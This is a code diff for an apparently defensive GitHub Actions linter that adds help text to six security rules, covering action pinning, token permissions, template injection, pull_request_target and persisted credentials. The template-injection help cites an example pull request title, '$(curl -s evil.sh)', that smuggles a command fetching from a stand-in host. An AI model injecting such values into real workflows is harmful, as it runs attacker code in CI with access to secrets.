@@ -22,6 +22,8 @@ class Rule:
     name: str
     summary: str
     check: Callable[[Workflow], Iterator[Finding]]
+    help: str = ""
+    """Why it matters and how to fix it; shown in code scanning (SARIF ``help``)."""
 
 
 def _at(
@@ -207,26 +209,64 @@ RULES: tuple[Rule, ...] = (
         "unpinned-action",
         "Actions and reusable workflows not pinned to a commit SHA",
         unpinned_actions,
+        help=(
+            "A tag or branch such as @v4 can be moved to different code after you've reviewed it; a "
+            "full 40-character commit SHA can't. Pin with uses: owner/repo@<sha>  # v4 (workflow-"
+            "guard --fix does this)."
+        ),
     ),
-    Rule("WG002", "missing-permissions", "No explicit GITHUB_TOKEN permissions", missing_permissions),
-    Rule("WG003", "write-all", "'permissions: write-all'", write_all),
+    Rule(
+        "WG002",
+        "missing-permissions",
+        "No explicit GITHUB_TOKEN permissions",
+        missing_permissions,
+        help=(
+            "Without permissions: the GITHUB_TOKEN gets the repository's default, which may be "
+            "read/write for everything. Add permissions: contents: read at the top and widen it per "
+            "job only where needed."
+        ),
+    ),
+    Rule(
+        "WG003",
+        "write-all",
+        "'permissions: write-all'",
+        write_all,
+        help=(
+            "write-all gives every step a token that can push code, create releases and change "
+            "issues. List only the scopes the job needs."
+        ),
+    ),
     Rule(
         "WG004",
         "template-injection",
         "Untrusted ${{ }} values inside run: or github-script",
         template_injection,
+        help=(
+            "${{ }} values are pasted into the script before it runs, so a pull request title like "
+            '$(curl -s evil.sh) runs as code. Pass the value through env: and use "$VAR" in the '
+            "script instead."
+        ),
     ),
     Rule(
         "WG005",
         "pull-request-target",
         "pull_request_target, especially with a checkout of the PR",
         pull_request_target,
+        help=(
+            "pull_request_target runs with secrets and a write token even for pull requests from "
+            "forks. Never check out and run the pull request's code in it; use pull_request instead "
+            "where possible."
+        ),
     ),
     Rule(
         "WG006",
         "persisted-credentials",
         "actions/checkout without persist-credentials: false",
         persisted_credentials,
+        help=(
+            "actions/checkout stores the token in .git/config, where every later step (and anything "
+            "it downloads) can read it. Set persist-credentials: false unless a step pushes."
+        ),
     ),
 )
 RULE_IDS = frozenset(r.id for r in RULES)
